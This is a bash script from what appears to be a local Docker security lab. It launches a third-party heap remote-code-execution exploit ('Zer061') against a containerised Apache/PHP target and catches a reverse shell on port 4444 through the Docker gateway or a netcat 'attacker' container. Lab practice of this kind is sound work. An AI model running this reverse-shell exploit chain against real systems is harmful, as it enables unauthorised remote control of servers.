#!/usr/bin/env bash
# Full reverse shell against target-apache (Zer061 heap RCE). Requires apache-up + fetch-zer061.
set -euo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
# shellcheck source=scripts/docker-env.sh
source "$ROOT/scripts/docker-env.sh"
EXPLOIT_DIR="$ROOT/third_party/zer061-php2shell"
OFFSETS_PY="$EXPLOIT_DIR/docker/offsets.py"
OFFSETS_ENV="$EXPLOIT_DIR/out/offsets.env"
CONTAINER="${ZER061_CONTAINER:-vtbw-php2shell-apache}"
HOST_URL="${ZER061_URL:-http://127.0.0.1:19288/index.php}"
PORT="${ZER061_LPORT:-4444}"
RETRIES="${ZER061_RETRIES:-12}"

if [[ ! -t 0 ]]; then
  echo "FEHLER: Interaktives Terminal nötig (TTY). Beispiel:" >&2
  echo "  ~/Schreibtisch/cursor-projects/vtbw-php2shell-lab zer061-shell" >&2
  exit 1
fi

cd "$ROOT"
mkdir -p "$EXPLOIT_DIR/out"
chmod 1777 "$EXPLOIT_DIR/out" 2>/dev/null || true

if [[ ! -f "$EXPLOIT_DIR/exploit.py" ]]; then
  echo "FEHLER: fetch-zer061 zuerst ausführen" >&2
  exit 1
fi

if ! docker ps --format '{{.Names}}' | grep -qx "$CONTAINER"; then
  echo "FEHLER: $CONTAINER läuft nicht — apache-up zuerst" >&2
  exit 1
fi

echo "[zer061-shell] Baue attacker (netcat für Listener) …"
docker compose --profile tools build attacker

if [[ -f "$OFFSETS_PY" ]]; then
  echo "[zer061-shell] Offsets aus $CONTAINER …"
  python3 "$OFFSETS_PY" "$CONTAINER" "$OFFSETS_ENV"
fi

run_via_host() {
  local gw net_name
  net_name="$(docker inspect "$CONTAINER" --format '{{range $k,$v := .NetworkSettings.Networks}}{{$k}}{{"\n"}}{{end}}' | head -1)"
  gw="$(docker network inspect "$net_name" --format '{{(index .IPAM.Config 0).Gateway}}')"
  echo "[zer061-shell] Host-Modus: Exploit → $HOST_URL, Listener auf Host :$PORT (Gateway $gw)"
  echo "[zer061-shell] Apache verbindet zu ${gw}:${PORT}"
  export ZER061_RETRIES="$RETRIES" ZER061_LPORT="$PORT"
  exec python3 "$EXPLOIT_DIR/exploit.py" -u "$HOST_URL" \
    --docker-container "$CONTAINER" \
    --profile bookworm --retries "$RETRIES" \
    --offsets-file "$OFFSETS_ENV" \
    --revshell "${gw}:${PORT}"
}

if curl -fsS --max-time 2 "$HOST_URL" >/dev/null 2>&1; then
  run_via_host
fi

echo "[zer061-shell] Host :19288 nicht erreichbar — Listener im attacker-Container"
export ZER061_RETRIES="$RETRIES" ZER061_LPORT="$PORT"
exec docker compose --profile tools run --rm -it attacker \
  /opt/lab/scripts/run-zer061-revshell.sh
